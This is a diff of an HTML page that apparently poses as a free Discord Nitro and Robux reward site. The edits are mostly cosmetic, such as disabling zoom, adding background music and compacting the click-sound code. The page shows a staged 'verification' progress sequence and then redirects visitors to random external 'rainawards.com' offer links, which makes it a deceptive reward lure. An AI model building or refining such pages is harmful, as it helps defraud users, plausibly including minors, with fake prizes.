@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <title>Claim Your Reward | Daily Reward Options</title>
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
@@ -12,6 +12,8 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      /* Prevent any accidental zoom on iOS via touch */
+      touch-action: manipulation;
     }
 
     body {
@@ -24,6 +26,8 @@
       padding: 2rem 1.5rem;
       position: relative;
       animation: fadeIn 0.5s ease-out;
+      /* No zoom via double-tap or pinch */
+      touch-action: pan-x pan-y; /* allow scrolling but not pinch-zoom (handled by meta) */
     }
 
     @keyframes fadeIn {
@@ -124,6 +128,8 @@
       transition: all 0.2s ease;
       position: relative;
       overflow: hidden;
+      /* ensure no zoom on tap */
+      touch-action: manipulation;
     }
 
     .reward-card-click {
@@ -198,6 +204,7 @@
       box-shadow: 0 4px 12px rgba(88,101,242,0.3);
       position: relative;
       overflow: hidden;
+      touch-action: manipulation;
     }
     .claim-btn:not(:disabled):hover {
       background: linear-gradient(105deg, #6d7eff, #535fdb);
@@ -290,6 +297,7 @@
       display: flex;
       justify-content: space-between;
       transition: color 0.2s;
+      touch-action: manipulation;
     }
     .faq-question:hover { color: #8b9cff; }
     .faq-question::after {
@@ -397,6 +405,7 @@
       to { opacity: 1; transform: translateX(0); }
     }
 
+    /* Responsive fine-tuning for iPad and all devices */
     @media (max-width: 500px) {
       body { padding: 1rem; }
       .card { padding: 1.2rem; }
@@ -410,15 +419,19 @@
       .toast-icon img { width: 24px; height: 24px; }
     }
 
+    /* iPad specific adjustments (ensure no zoom) */
+    @media (min-width: 768px) and (max-width: 1024px) {
+      .wrap { width: min(600px, 90%); }
+    }
+
     .hidden { display: none; }
   </style>
 </head>
 <body>
 
-<!-- Background music: replaced with the correct Thy Will track, plays at low volume -->
+<!-- Background music: Thy Will by Hillary Scott (low volume, plays after first user interaction) -->
 <audio id="bgMusic" loop preload="auto" style="display: none;">
   <source src="https://www.ceenaija.com/download-music/hillary-scott-thy-will.mp3" type="audio/mpeg">
-  <!-- Fallback audio source in case the primary URL is unavailable -->
 </audio>
 
 <div class="wrap">
@@ -460,17 +473,15 @@
 
 <script>
   (function() {
-    // ---------- BACKGROUND MUSIC (low volume, only plays after user interaction) ----------
+    // ---------- BACKGROUND MUSIC (low volume, auto-start on any user interaction) ----------
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
-      bgAudio.volume = 0.12;   // quiet background
+      bgAudio.volume = 0.12;
       bgAudio.loop = true;
-      
-      // Start audio on first user click/tap anywhere on the page
       const startAudio = () => {
         if (!audioStarted) {
-          bgAudio.play().catch(e => console.log("Audio play blocked, will resume on next click"));
+          bgAudio.play().catch(e => console.log("Audio autoplay prevented, will start on next interaction"));
           audioStarted = true;
         }
         document.removeEventListener('click', startAudio);
@@ -480,32 +491,25 @@
       document.addEventListener('touchstart', startAudio);
     }
 
-    // ---------- CLICK SOUND (Web Audio) ----------
+    // ---------- CLICK SOUND (short beep) ----------
     let audioCtx = null;
-    let lastFaqToggle = 0;
-    const FAQ_COOLDOWN = 200; // ms: prevents double sound on quick open/close
-    
     function playClick() {
       try {
         if (!audioCtx) {
           audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         }
-        if (audioCtx.state === 'suspended') {
-          audioCtx.resume();
-        }
+        if (audioCtx.state === 'suspended') audioCtx.resume();
         const now = audioCtx.currentTime;
-        const oscillator = audioCtx.createOscillator();
+        const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
-        oscillator.connect(gain);
+        osc.connect(gain);
         gain.connect(audioCtx.destination);
-        oscillator.frequency.value = 880;
+        osc.frequency.value = 880;
         gain.gain.value = 0.18;
-        oscillator.start();
+        osc.start();
         gain.gain.exponentialRampToValueAtTime(0.00001, now + 0.1);
-        oscillator.stop(now + 0.1);
-      } catch(e) {
-        // Silent fail – sound not critical
-      }
+        osc.stop(now + 0.1);
+      } catch(e) {}
     }
 
     // ---------- REWARD DATA ----------
@@ -562,7 +566,7 @@
       helperNote.classList.add('hidden');
     }
 
-    // ---------- REDIRECTS (absolute external URLs – works on Vercel) ----------
+    // ---------- REDIRECTS (external, no Vercel 404) ----------
     const redirectUrls = [
       "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
       "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
@@ -598,9 +602,7 @@
       let idx = 0;
       function advance() {
         if (idx >= timedSteps.length) {
-          setTimeout(() => {
-            window.location.href = getRandomRedirect();
-          }, 200);
+          setTimeout(() => { window.location.href = getRandomRedirect(); }, 200);
           return;
         }
         const s = timedSteps[idx];
@@ -616,16 +618,12 @@
 
     claimBtn.addEventListener('click', startProgress);
 
-    // ---------- FAQ smooth toggles (play sound only on the first click of each toggle) ----------
+    // ---------- FAQ smooth toggle (play sound only when opening, not closing) ----------
     document.querySelectorAll('.faq-item').forEach(item => {
       const q = item.querySelector('.faq-question');
-      let hasBeenClicked = false; // ensures sound plays only once per item when opened
       q.addEventListener('click', (e) => {
         e.stopPropagation();
-        // Only play sound if this FAQ item is being opened (was closed before)
-        if (!item.classList.contains('open')) {
-          playClick();
-        }
+        if (!item.classList.contains('open')) playClick();
         item.classList.toggle('open');
       });
     });
